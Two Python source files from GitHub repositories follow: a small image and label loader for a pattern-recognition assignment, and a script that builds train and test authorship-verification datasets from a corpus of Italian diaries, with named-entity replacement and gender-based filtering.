{"blob_id": "09a25a58c1b46bcb4d75f7d610f5ef9119994766", "directory_id": "4443a051136c23156fefc56b50e467dd0717dc07", "path": "/mp1/utils/io_tools.py", "content_id": "3656661d044b43dbe104c1e3f87d0503b632b088", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "therealJacobWu/pattern_recognition", "snapshot_id": "6eefbbaa2d8584b800b234c4073b3704469a446a", "revision_id": "09fe9c0054110f9ba10116a5cf3fc42a6eb58a54", "branch_name": "refs/heads/master", "visit_date": "2021-08-28 20:26:39.898397", "revision_date": "2017-12-13 04:09:51", "committer_date": "2017-12-13 04:09:51", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1620", "extension": "py", "content": "\"\"\"Input and output helpers to load in data.\n\"\"\"\n\nimport numpy as np\nimport skimage\nimport os\nfrom skimage import io\n\n\ndef read_dataset(data_txt_file, image_data_path):\n    \"\"\"Read data into a Python dictionary.\n    Args:\n        data_txt_file(str): path to the data txt file.\n        image_data_path(str): path to the image directory.\n    Returns:\n        data(dict): A Python dictionary with keys 'image' and 'label'.\n            The value of dict['image'] is a numpy array of dimension (N,28,28)\n            containing the loaded images.\n\n            The value of dict['label'] is a numpy array of dimension (N,)\n            containing the loaded label.\n\n            N is the number of examples in the data split, the exampels should\n            be stored in the same order as in the txt file.\n    \"\"\"\n\n    file= open(data_txt_file, 'r')\n    data = {}\n    file_size = sum(1 for _ in file)\n    images = np.ndarray(shape = (file_size,28,28))\n    labels = np.ndarray(shape = (file_size,))\n    count = 0\n    for line in file.readlines():\n        image_name = line.strip().split('\\t')[0]    \n        images[count] = io.imread(image_data_path+'/'+image_name,True)\n        labels[count] = int(line.strip().split('\\t')[1])\n        count += 1\n    file.close()\n    data['image'] = images\n    data['label'] = labels\n\n    return data\n\n\ndef write_dataset(data_txt_file, data):\n    \"\"\"Write python dictionary data into csv format for kaggle.\n    Args:\n        data_txt_file(str): path to the data txt file.\n        data(dict): A Python dictionary with keys 'image' and 'label',\n          (see descriptions above).\n    \"\"\"\n    pass\n"}
{"blob_id": "8757d46c2b41464f846cb2bf2abccb19e76fa07e", "directory_id": "33de2276306867776e82178d9132ab1f2818205f", "path": "/make_Diaries_dataset.py", "content_id": "16e3069f36cdc1f5177adb5382d17e3f19f4fefa", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "garuggiero/Italian-Datasets-for-AV", "snapshot_id": "c63193bf28748d386de7b9aaa86c56776f935ab7", "revision_id": "11b021077e598c40514fe352574db261e7260b38", "branch_name": "refs/heads/main", "visit_date": "2023-01-06 23:23:33.042897", "revision_date": "2020-10-28 19:46:35", "committer_date": "2020-10-28 19:46:35", "github_id": "307665090", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "31923", "extension": "py", "content": "# File name: make_Diaries_dataset.py\n# Description: this file reformats corpus into an AV dataset\n# Authors: Gaetana Ruggiero\n# Date: 31-08-2020\n\nimport os\nimport re\nimport csv\nimport json\nimport shutil\nimport random\nimport spacy\nimport argparse\nimport numpy as np\nimport pandas as pd\nfrom spacy import displacy\nfrom nltk import FreqDist\nfrom collections import Counter\nfrom sklearn.cross_validation import train_test_split\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.tag import StanfordNERTagger\nfrom nltk.tokenize import word_tokenize\n\n\ndef parse_arguments():\n    '''Read arguments from a command line'''\n    parser = argparse.ArgumentParser(description='Please add arguments')\n    parser.add_argument(\"--base_path\", metavar='PATH', required=True,\n        help='folder containing the tsv file with the corpus')\n    parser.add_argument(\"--n\", type=int, required=True,\n        help='number of words to be considered per each author/instance')\n    parser.add_argument(\"--gender\", required=True,\n        help='specify the gender setting: mixed, females, males')\n    parser.add_argument(\"--entities\", required=True,\n        help='specify if data needs to contain named entities or if they are replaced: yes if entities must be present, no if entities must be replaced')\n    parser.add_argument(\"--downsize\", required=False,\n        help='specify if pool of authors is downsized to the same pool of authors of the 3000 words case: it can only be yes')\n\n    args = parser.parse_args()\n    return args\n\n\ndef access_dataset(base_path):\n    '''access the diaries and transforms them into a big pandas dataframe'''\n\n    for (path, dirs, files) in os.walk(base_path):\n        if files:\n            for file in files:\n                file_name = os.path.join(path, file)\n                if file_name.endswith('.tsv'):\n                    with open(file_name) as tsvfile:\n                        if os.stat(file_name).st_size != 0:\n                            data = pd.read_csv(file_name, sep='\\t', names=['index','storytitle', 'author', 'gender', 'text', 'place&date', 'themes', 'period', 'emigrationcountry', 'link2story', 'link2author']) #transform it into a pandas df\n                            data = data.sort_values(by='author')\n                            pd.set_option('display.max_columns', None)\n                            pd.set_option('display.max_rows', None)\n\n                        elif os.stat(file_name).st_size == 0:\n                            print(os.path.basename(path), ' IS EMPTY')\n\n    return data\n\n\ndef get_details_topic(big_dataframe):\n\n    '''takes the dataframe and returns three ordered lists containing the names of the authors,\n    their gender and the text of each one of their stories'''\n\n    top_authors_name = [] #top == topic\n    top_authors_gender = []\n    top_texts = []\n\n    for indx, author in enumerate(big_dataframe.author):\n        top_authors_name.append(author)\n    for indx, gender in enumerate(big_dataframe.gender):\n        top_authors_gender.append(gender)\n    for indx, text in enumerate(big_dataframe.text):\n        top_texts.append(text)\n\n    top_unique_authors = set(top_authors_name)\n    len_top_unique_authors = len(set(top_authors_name))\n\n    print('There are', len_top_unique_authors, ' authors in total')\n    print(' ')\n    print('the blog posts are', len(top_texts), 'in total')\n    zipped = zip(top_authors_name, top_texts, top_authors_gender)\n    zipped = sorted(zipped)\n    top_authors_name, top_texts, top_authors_gender = zip(*zipped)\n\n    return top_authors_name, top_authors_gender, top_texts\n\n\ndef sort_texts(top_authors, top_texts, index_dict):\n    '''takes the authors list and the list of texts and randomizes the texts from\n    the same author, so that the still remain paired. It returns the randomized list of texts'''\n\n    processed = set()\n    new_top_texts = []\n\n    for author, text in zip(top_authors, top_texts):\n        if author in index_dict.keys():\n            if author in processed:\n                pass\n            else:\n                authors_texts = []\n                min = index_dict[author][0]\n                max = index_dict[author][1]\n                max += 1\n\n                for i in range(min, max):\n                    authors_texts.append(top_texts[i])\n\n                random.seed(42)\n                random.shuffle(authors_texts)\n                new_top_texts.extend(authors_texts)\n                processed.add(author)\n\n    return new_top_texts\n\n\ndef make_index_dict(names):\n    '''returns a dictionary where the key is the name of the author and the value\n     is a list indicating the min and max indx correspondent to his texts (teaken from the ordered list of texts)'''\n    index_dict = dict()\n    min = 0\n\n    for indx, name in enumerate(names):\n        if indx != len(names)-1 and names[indx+1] == name:\n            pass\n        else:\n            index_dict[name] = [min, indx]\n            min = indx+1\n    return index_dict\n\n\ndef unify(names, gender, texts, index_dict):\n    '''takes three ordered lists of authors' names, genders and stories and puts together the stories written by the same author in one big string.\n    The NER function is also called: entities are replaced by their label.\n    Returns three lists: each author name is paired with their gender and all of their stories'''\n\n    unique_authors = []\n    unified_texts = []\n    all_genders = []\n    analyzed = set()\n    author2texts = dict()\n\n    for indx, name in enumerate(names):\n        if name in analyzed:\n            pass\n        else:\n            checkmarks =[]\n            min_indx = index_dict[name][0]\n            max_index = index_dict[name][1]\n            max_index += 1\n            k_A = ''\n            checkmark = 0\n\n            for i in range(min_indx, max_index):\n                words = word_tokenize(texts[i])\n                checkmark = checkmark + (len(words)-1)\n                checkmarks.append(checkmark)\n\n                k_A += str(texts[i])\n                string_length = len(k_A)+1\n                k_A = k_A.ljust(string_length)\n\n            unique_authors.append(name)\n            unified_texts.append(k_A)\n            all_genders.append(gender[indx])\n            author2texts[name] = checkmarks\n            analyzed.add(name)\n\n    if args.entities == 'no':\n\n        print(\"\")\n        print('Replacing entities across the documents...')\n\n        unified_texts = find_entities(unified_texts)\n\n    return unique_authors, unified_texts, all_genders, author2texts\n\n\ndef statistics(unique_names, unified_texts, all_genders, n):\n    '''prints the average number of words present in the topic, the min and max number of words,\n    the number of female and male authors and the total number of authors'''\n\n    texts_lens_w = []\n    count= 0\n\n    for indx,text in enumerate(unified_texts):\n        words = word_tokenize(text)\n        texts_lens_w.append(len(words))\n\n        if len(words) < n:\n            count += 1\n\n    average_len_w = sum(texts_lens_w)/len(texts_lens_w)\n    min_len_w = min(texts_lens_w)\n    max_len_w = max(texts_lens_w)\n\n    print('The average len of the texts is:', average_len_w)\n    print('The min number of words in the texts is', min_len_w)\n    print('The max number of words in the texts is', max_len_w)\n    print('')\n    print(count, 'texts have less than', n, 'words')\n    print('')\n\n    gender_distr= Counter(all_genders)\n\n    print('There are', gender_distr['Female'], 'female authors and', gender_distr['Male'],\n    'male authors, and ', gender_distr['Unknown'], 'authors whose gender is not known, for a total of', len(unique_names), 'authors')\n\n\ndef find_entities(texts):\n    '''takes a list of texts, does NER and returns a new list with replaced entities'''\n    entities = []\n    new_texts = []\n\n    model_it = spacy.load('it_core_news_sm')\n\n    for indx,text in enumerate(texts):\n        doc = model_it(text)\n        for entity in doc.ents:\n            entities.append(entity.label_)\n\n        #code adapted from https://stackoverflow.com/questions/58712418/replace-entity-with-its-label-in-spacy\n        newstring = text\n        for entity in reversed(doc.ents):\n            start = entity.start_char\n            end = start + len(entity.text)\n            if entity.label_ == 'PERSON':\n                newstring = newstring[:start] + 'PERSON' + newstring[end:]\n            elif entity.label_ == 'LOC':\n                newstring = newstring[:start] + 'LOC' + newstring[end:]\n            elif entity.label_ == 'ORG':\n                newstring = newstring[:start] + 'ORG' + newstring[end:]\n\n        new_texts.append(newstring)\n    fd_ent = FreqDist(entities)\n\n    # print('The most frequent entities are', fd_ent.most_common(20))\n    # print(texts[0])\n    # print(new_texts[0])\n\n    return new_texts\n\n\ndef trim_3k(names, texts, genders, author2texts):\n    '''\n    names: list of unique author names\n    texts: list of unified texts (one per author)\n    genders: list of authors' gender\n\n    return: lists of mixed authors, female and male authors with 3000 words texts\n    '''\n\n    female_3k = []\n    male_3k = []\n\n    filtered = []\n    for indx, (name, text, gender) in enumerate(zip(names,texts, genders)):\n        if len(word_tokenize(text)) >= 3000:\n            filtered.append((name,text,gender))\n\n    names_3k_trim, texts_3k_trim, genders_3k_trim = zip(*filtered)\n\n    authors_with_3k_words, unknown_authors_same, known_texts, unknown_texts, known_authors_gender, to_delete = split_in_known_unknown(names_3k_trim, texts_3k_trim, genders_3k_trim, 3000, author2texts)\n\n    for name, gender in zip(authors_with_3k_words, known_authors_gender):\n        if gender == 'Female':\n            female_3k.append(name)\n        elif gender == 'Male':\n            male_3k.append(name)\n\n    print('The number of authors with 3000 words texts is', len(authors_with_3k_words), ' of which', len(female_3k), ' are females and ', len(male_3k), 'are males')\n\n    return authors_with_3k_words, female_3k, male_3k\n\n\ndef trim(names, texts, genders, n):\n    '''\n    names: list of unique author names\n    texts: list of unified texts (one per author)\n    genders: list of author's gender\n    n: min number of words per text wanted\n\n    return: the three trimmed original lists\n    '''\n\n    print('Removing all the texts with less than', n, 'words')\n    print('Removing all the authors whose gender is not known')\n\n    less_than_n = []\n    filtered = []\n\n    for indx, (name, text, gender) in enumerate(zip(names,texts, genders)):\n        if len(word_tokenize(text)) < n:\n            less_than_n.append((name, indx))\n\n        #take only texts with more than n num of words\n        elif len(word_tokenize(text)) >= n and gender != 'Unknown':\n            filtered.append((name,text,gender))\n\n    names_trim, texts_trim, genders_trim = zip(*filtered)\n    gender_distr = Counter(genders_trim)\n\n    return names_trim, texts_trim, genders_trim\n\n\ndef downsize(names_trim, texts_trim, genders_trim, authors_with_3k_words, females_3k, males_3k):\n    '''takes the trimmed author names, texts and gender lists, and the list authors with 3k words\n    of the authors with 3k words texts and returns the first three lists with the same authors as in the 3k words case'''\n\n    names_trim_downsized = []\n    texts_trim_downsized = []\n    genders_trim_downsized = []\n\n    print(\"Downsizing number of authors...\")\n\n    if args.gender == 'mixed':\n        for (name, text, gender) in (zip(names_trim, texts_trim, genders_trim)):\n                for author in authors_with_3k_words:\n                    if name == author:\n                        names_trim_downsized.append(name)\n                        texts_trim_downsized.append(text)\n                        genders_trim_downsized.append(gender)\n                    else:\n                        pass\n\n        print('The number of authors with 3000 words texts are ', len(authors_with_3k_words))\n    else:\n        female_authors, male_authors, female_texts, male_texts, female_authors_genders, male_authors_genders = extract_same_gender(names_trim, texts_trim, genders_trim)\n\n        if args.gender == 'females':\n            #downsize the current authors so that they match the female authors with 3000 words\n            for (name, text, gender) in (zip(female_authors, female_texts, female_authors_genders)):\n                for author in females_3k:\n                    if name == author:\n                        names_trim_downsized.append(name)\n                        texts_trim_downsized.append(text)\n                        genders_trim_downsized.append(gender)\n                    else:\n                        pass\n            print('The number of female authors with 3000 words texts are ', len(females_3k))\n\n        elif args.gender == 'males':\n            for (name, text, gender) in (zip(male_authors, male_texts, male_authors_genders)):\n                for author in males_3k:\n                    if name == author:\n                        names_trim_downsized.append(name)\n                        texts_trim_downsized.append(text)\n                        genders_trim_downsized.append(gender)\n                    else:\n                        pass\n\n            print('The number of male authors with 3000 words texts are ', len(males_3k))\n\n    names_trim_downsized, texts_trim_downsized, genders_trim_downsized = shuffle(names_trim_downsized, texts_trim_downsized, genders_trim_downsized)\n    print('When downsizing, the total number of authors becomes ', len(names_trim_downsized))\n\n\n    return names_trim_downsized, texts_trim_downsized, genders_trim_downsized\n\n\ndef shuffle(names_trim, texts_trim, genders_trim):\n    '''takes three lists and shuffles them'''\n\n    print('Shuffling...')\n    zipped = list(zip(names_trim, texts_trim, genders_trim))\n    random.seed(42)\n    random.shuffle(zipped)\n    names_trim, texts_trim, genders_trim = zip(*zipped)\n\n    return names_trim, texts_trim, genders_trim\n\n\ndef extract_same_gender(trimmed_authors, trimmed_texts, trimmed_genders):\n    '''takes the three trimmed lists of authors, texts and genders and a number n\n    and separates them into female and male authors, texts and gender lists'''\n\n    female_authors = []\n    male_authors = []\n    female_texts = []\n    male_texts = []\n    female_authors_genders = []\n    male_authors_genders = []\n\n    for (author, text, gender) in zip(trimmed_authors, trimmed_texts, trimmed_genders):\n        if gender == 'Female':\n            female_authors.append(author)\n            female_texts.append(text)\n            female_authors_genders.append(gender)\n\n        elif gender == 'Male':\n            male_authors.append(author)\n            male_texts.append(text)\n            male_authors_genders.append(gender)\n\n    return female_authors, male_authors, female_texts, male_texts, female_authors_genders, male_authors_genders\n\n\ndef split_in_known_unknown(trimmed_authors, trimmed_texts, trimmed_genders, n, author2texts):\n    '''takes the three lists of authors, texts and genders and a number of words n\n    and returns:\n\n    a list of known Authors\n    a list of unknown Authors\n    a list of known texts\n    a list of unknown texts\n    a list of known authors genders\n    a list of unknown authors genders\n    a list of deleted authors\n    '''\n\n    known_authors = []\n    known_authors_gender = []\n    known_texts = []\n    unknown_texts = []\n\n    to_delete = []\n\n    for (author, text, gender) in zip(trimmed_authors, trimmed_texts, trimmed_genders):\n        words = word_tokenize(text)\n        checkmarks = author2texts[author]\n        known_t = []\n        unknown_t = []\n\n        start_unknown = None\n\n        for indx, checkmark in enumerate(checkmarks):\n            if len(known_t) != int(n/2):\n                if checkmark < int(n/2):\n                    pass\n                elif checkmark >= int(n/2):\n                    if checkmark != checkmarks[-1]:\n                        start_unknown = checkmarks[indx+1]\n                        known_t = [word for word in words[:int(n/2)]]\n\n                    else:\n                        to_delete.append([author,text,gender])\n\n\n            else:\n                if len(unknown_t) != int(n/2):\n                    diff = checkmark - start_unknown\n                    if diff < int(n/2):\n                        if checkmark == checkmarks[-1]:\n                            to_delete.append([author,text,gender])\n                        else:\n                            pass\n                    elif diff == int(n/2):\n                        unknown_t = [word for word in words[start_unknown:checkmark]]\n\n                    elif diff > int(n/2):\n                        unknown_t = [word for word in words[start_unknown:]]\n                        unknown_t = [word for word in unknown_t[:int(n/2)]]\n\n\n        if len(known_t) != 0 and len(unknown_t) != 0:\n            known = ' '.join(known_t)\n            unknown = ' '.join(unknown_t)\n\n            known_authors.append(author)\n            known_texts.append(known)\n            unknown_texts.append(unknown)\n            known_authors_gender.append(gender)\n\n    print('In the process ', str(len(trimmed_authors) - len(known_authors)),' authors have been deleted')\n\n    gender_distr= Counter(known_authors_gender)\n\n    print('In the new subset there are', gender_distr['Female'], 'female authors and', gender_distr['Male'],\n    'male authors, for a total of', len(known_authors), 'authors')\n\n    unknown_authors_same = [author for author in known_authors]\n\n\n    return known_authors, unknown_authors_same, known_texts, unknown_texts, known_authors_gender, to_delete\n\n\ndef make_known_unknown(known_authors, unknown_authors_same, known_texts, unknown_texts, known_authors_gender):\n    ''''takes lists of known Authors, unknown Authors, known texts, unknown texts, known authors genders and unknown authors genders\n    and returns:\n    a dictionary {'author': [number, known_text, unknown_text, gender]}\n    known_unknown pairs to be used for training and testing'''\n\n    author2info = dict()\n\n    unknown_authors_gender_same = [gender for gender in known_authors_gender]\n\n    number = 1\n    for indx, author in enumerate(known_authors):\n        author2info[author] = [number, known_texts[indx], unknown_texts[indx], known_authors_gender[indx]]\n        number += 1\n\n    # print(author2index)\n    yes_label = 'Y'\n    no_label = 'N'\n    k_u_pairs = []\n\n    for indx, (k_A, u_A, k_T, u_T) in enumerate(zip(known_authors, unknown_authors_same, known_texts, unknown_texts)):\n        if indx <= round((len(known_authors)-1)/2): #from index 0 to half (12)\n            k_u_pairs.append([(k_T, u_T), yes_label, author2info[k_A][3], author2info[u_A][3], k_A, u_A])\n\n        elif indx == round(len(known_authors)/2): #index half+1 (13)\n            k_u_pairs.append([(k_T, unknown_texts[len(known_authors)-1]), no_label, author2info[k_A][3], unknown_authors_gender_same[len(known_authors)-1], k_A, unknown_authors_same[len(known_authors)-1]])\n\n        elif indx == len(known_authors)-1: #last index\n            k_u_pairs.append([(k_T, unknown_texts[len(known_authors)-2]), no_label, author2info[k_A][3], unknown_authors_gender_same[len(known_authors)-2], k_A, unknown_authors_same[len(known_authors)-2]])\n\n        else: #index in range half+1, last-1\n            k_u_pairs.append([(k_T, unknown_texts[indx+1]), no_label, author2info[k_A][3], unknown_authors_gender_same[indx+1], k_A, unknown_authors_same[indx+1]])\n\n\n\n    return author2info, k_u_pairs\n\n\ndef train_test(known_unknown_pairs):\n    '''takes the known_unknown pairs and splits them into training and test'''\n\n    k_u_tuples = []\n    labels = []\n    k_u_gender = dict()\n    k_u_authors = dict()\n\n\n    for elem in known_unknown_pairs:\n        k_u_tuples.append(elem[0])\n        labels.append(elem[1])\n        k_u_gender[elem[0]] = [elem[2], elem[3]]\n        k_u_authors[elem[0]] = [elem[4], elem[5]]\n\n\n    X_train, X_test, y_train, y_test = train_test_split(k_u_tuples, labels, test_size=0.30, random_state=42)\n\n    print('')\n    print(len(X_train), 'pairs are used for training', len(X_test), 'pairs are used for testing')\n\n    train_k_u_authors = []\n    test_k_u_authors = []\n\n    for elem in X_train:\n        train_k_u_authors.append(k_u_authors[elem])\n    for elem in X_test:\n        test_k_u_authors.append(k_u_authors[elem])\n\n    train_k_gender = []\n    train_u_gender = []\n\n    test_k_gender = []\n    test_u_gender = []\n\n    for elem in X_train:\n        train_k_gender.append(k_u_gender[elem][0])\n        train_u_gender.append(k_u_gender[elem][1])\n\n    for elem in X_test:\n        test_k_gender.append(k_u_gender[elem][0])\n        test_u_gender.append(k_u_gender[elem][1])\n\n    print('Gender distr known authors in train:', Counter(train_k_gender))\n    print('Gender distr UNknown authors in train:', Counter(train_u_gender))\n\n    print('Gender distr known authors in test:', Counter(test_k_gender))\n    print('Gender distr UNknown authors in test:', Counter(test_u_gender))\n\n\n    return X_train, X_test, y_train, y_test, k_u_gender, train_k_gender, train_u_gender, test_k_gender, test_u_gender, train_k_u_authors, test_k_u_authors\n\n\ndef make_folders(X, y, specify_set, specify_n, specify_gender):\n\n        root_path = '/home/gaetana/Desktop/AV_Diaries/'\n\n        folders = []\n\n        for i in range(1, len(X)+1):\n            if i <= 9:\n                folder_name = 'IT00'\n                folder_name += str(i)\n                folders.append(folder_name)\n            elif i > 9:\n                folder_name = 'IT0'\n                folder_name += str(i)\n                folders.append(folder_name)\n            else:\n                folder_name = 'IT'\n                folder_name += str(i)\n                folders.append(folder_name)\n\n        if args.downsize == 'yes':\n            if os.path.exists(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'):\n                shutil.rmtree(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized')\n\n            os.mkdir(os.path.join(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'))\n            processed = set()\n\n            with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/contents.json', mode='w', encoding='utf-8') as f:\n                entry = {\"language\": \"Italian\", \"problems\": folders}\n                json.dump(entry, f)\n\n\n            for folder in folders:\n                os.mkdir(os.path.join(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/')+str(folder))\n\n                for indx,(elem, label) in enumerate(zip(X, y)):\n                    if indx in processed:\n                        pass\n                    else:\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/'+str(folder)+'/known01.txt', 'w') as known:\n                            known.write(elem[0])\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/'+str(folder)+'/unknown.txt', 'w') as unknown:\n                            unknown.write(elem[1])\n                            processed.add(indx)\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/truth.txt', 'a') as truth:\n                            truth.write(folder+' '+label+'\\n')\n                            break\n        else:\n\n            if os.path.exists(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender):\n                shutil.rmtree(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender)\n\n            os.mkdir(os.path.join(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender))\n            processed = set()\n\n            with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/contents.json', mode='w', encoding='utf-8') as f:\n                entry = {\"language\": \"Italian\", \"problems\": folders}\n                json.dump(entry, f)\n\n\n            for folder in folders:\n                os.mkdir(os.path.join(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/')+str(folder))\n\n                for indx,(elem, label) in enumerate(zip(X, y)):\n                    if indx in processed:\n                        pass\n                    else:\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/'+str(folder)+'/known01.txt', 'w') as known:\n                            known.write(elem[0])\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/'+str(folder)+'/unknown.txt', 'w') as unknown:\n                            unknown.write(elem[1])\n                            processed.add(indx)\n                        with open(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/truth.txt', 'a') as truth:\n                            truth.write(folder+' '+label+'\\n')\n                            break\n        return folders\n\ndef make_info_file(folder_names, X, y, k_gender, u_gender, specify_set, specify_n, specify_gender):\n    '''make an info file containing foldern name, known_unknown text pairs, gold label, known&unknown gender'''\n\n    root_path = '/home/gaetana/Desktop/AV_Diaries/'\n\n    if args.downsize == 'yes':\n            if os.path.exists(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/INFO.csv'):\n                os.remove(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/INFO.csv')\n                print(\"File Removed!\")\n\n            dictionary = {'problem ID': folder_names, 'known_unknown pairs': X, 'k_gender': k_gender, 'u_gender': u_gender, 'gold label': y}\n            df = pd.DataFrame(data=dictionary)\n\n            csv_file = df.to_csv(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'_downsized'+'/INFO.csv', encoding='utf-8', index=False)\n    else:\n        if os.path.exists(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/INFO.csv'):\n            os.remove(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/INFO.csv')\n            print(\"File Removed!\")\n\n\n        dictionary = {'problem ID': folder_names, 'known_unknown pairs': X, 'k_gender': k_gender, 'u_gender': u_gender, 'gold label': y}\n        df = pd.DataFrame(data=dictionary)\n\n        csv_file = df.to_csv(root_path+'diaries_'+specify_set+'_'+specify_n+'_'+specify_gender+'/INFO.csv', encoding='utf-8', index=False)\n\n    return df\n\n#####################################################\ndef main():\n\n    print('Accessing the dataset and making the dataframe...')\n    dataframe = access_dataset(args.base_path)\n    print('')\n    print('Extracting the details...')\n\n    top_authors_name, top_authors_gender, top_texts = get_details_topic(dataframe)\n\n    index_dict = make_index_dict(top_authors_name)\n    new_top_texts = sort_texts(top_authors_name, top_texts, index_dict)\n\n    print('')\n    print('Unifying the information...')\n    unique_authors, unified_texts, all_genders, author2texts = unify(top_authors_name, top_authors_gender, new_top_texts, index_dict)\n\n    print('')\n    print('Before trimming------')\n    print('')\n\n    n = args.n\n\n    statistics(unique_authors, unified_texts, all_genders, n)\n\n    print('')\n    print('After trimming------')\n    unique_authors_trim, unified_texts_trim, all_genders_trim= trim(unique_authors, unified_texts, all_genders, n)\n\n    if args.downsize == 'yes':\n        authors_3k_words, females_3k, males_3k = trim_3k(unique_authors, unified_texts, all_genders, author2texts)\n\n        if args.gender == 'mixed':\n            unique_authors_trim, unified_texts_trim, all_genders_trim = downsize(unique_authors_trim, unified_texts_trim, all_genders_trim, authors_3k_words, females_3k, males_3k)\n        elif args.gender == 'females':\n            female_authors, female_texts, female_authors_genders = downsize(unique_authors_trim, unified_texts_trim, all_genders_trim, authors_3k_words, females_3k, males_3k)\n        elif args.gender == 'males':\n            male_authors, male_texts, male_authors_genders = downsize(unique_authors_trim, unified_texts_trim, all_genders_trim, authors_3k_words, females_3k, males_3k)\n\n    else:\n        print('')\n        unique_authors_trim, unified_texts_trim, all_genders_trim = shuffle(unique_authors_trim, unified_texts_trim, all_genders_trim)\n\n\n    print('')\n\n    ######### MIXED GENDER\n    if args.gender == 'mixed':\n        print('')\n        # statistics(unique_authors_trim, unified_texts_trim, all_genders_trim, n)\n        known_authors, unknown_authors_same, known_texts, unknown_texts, known_authors_gender, to_delete = split_in_known_unknown(unique_authors_trim, unified_texts_trim, all_genders_trim, n, author2texts)\n        author2info, k_u_pairs = make_known_unknown(known_authors, unknown_authors_same, known_texts, unknown_texts, known_authors_gender)\n\n        print('Splitting into training and test...')\n\n        X_train, X_test, y_train, y_test, k_u_gender, train_k_gender, train_u_gender, test_k_gender, test_u_gender, train_k_u_authors, test_k_u_authors =  train_test(k_u_pairs)\n\n\n    ######### SEPARATE GENDER\n\n    elif args.gender != 'mixed':\n        if args.downsize == 'yes':\n            pass\n        else:\n            female_authors, male_authors, female_texts, male_texts, female_authors_genders, male_authors_genders = extract_same_gender(unique_authors_trim, unified_texts_trim, all_genders_trim)\n\n\n        ######## FEMALES\n        if args.gender == 'females':\n\n            print('Extracting only female authors and their texts...')\n            print('')\n            statistics(female_authors, female_texts, female_authors_genders, n)\n\n            print('')\n            print('Creating the known-unknown female pairs...')\n            print('')\n            known_authors_female, unknown_authors_female_same, known_texts_female, unknown_texts_female, female_authors_gender, to_delete = split_in_known_unknown(female_authors, female_texts, female_authors_genders, n, author2texts)\n            author2info_female, k_u_pairs_female = make_known_unknown(known_authors_female, unknown_authors_female_same, known_texts_female, unknown_texts_female, female_authors_gender)\n            print('')\n\n\n            print('Splitting into training and test...')\n            X_train, X_test, y_train, y_test, k_u_gender, train_k_gender, train_u_gender, test_k_gender, test_u_gender, train_k_u_authors, test_k_u_authors =  train_test(k_u_pairs_female)\n\n\n        ######## MALES\n        elif args.gender == 'males':\n\n            print('Extracting only male authors and their texts')\n            # statistics(male_authors, male_texts, male_authors_genders, n)\n\n            print('')\n            print('Creating the known-unknown male pairs')\n            known_authors_male, unknown_authors_male_same, known_texts_male, unknown_texts_male, male_authors_genders, to_delete = split_in_known_unknown(male_authors, male_texts, male_authors_genders, n, author2texts)\n            author2info_male, k_u_pairs_male = make_known_unknown(known_authors_male, unknown_authors_male_same, known_texts_male, unknown_texts_male, male_authors_genders)\n            print('')\n\n            print('Splitting into training and test...')\n            X_train, X_test, y_train, y_test, k_u_gender, train_k_gender, train_u_gender, test_k_gender, test_u_gender, train_k_u_authors, test_k_u_authors =  train_test(k_u_pairs_male)\n\n    folders_train = make_folders(X_train, y_train, 'train', str(args.n), str(args.gender))\n    folders_test = make_folders(X_test, y_test, 'test', str(args.n), str(args.gender))\n\n    df_train = make_info_file(folders_train, X_train, y_train, train_k_gender, train_u_gender, 'train', str(args.n), str(args.gender))\n    df_test = make_info_file(folders_test, X_test, y_test, test_k_gender, test_u_gender, 'test', str(args.n), str(args.gender))\n\n\n\n\nif __name__ == '__main__':\n    args = parse_arguments()\n    main()\n"}
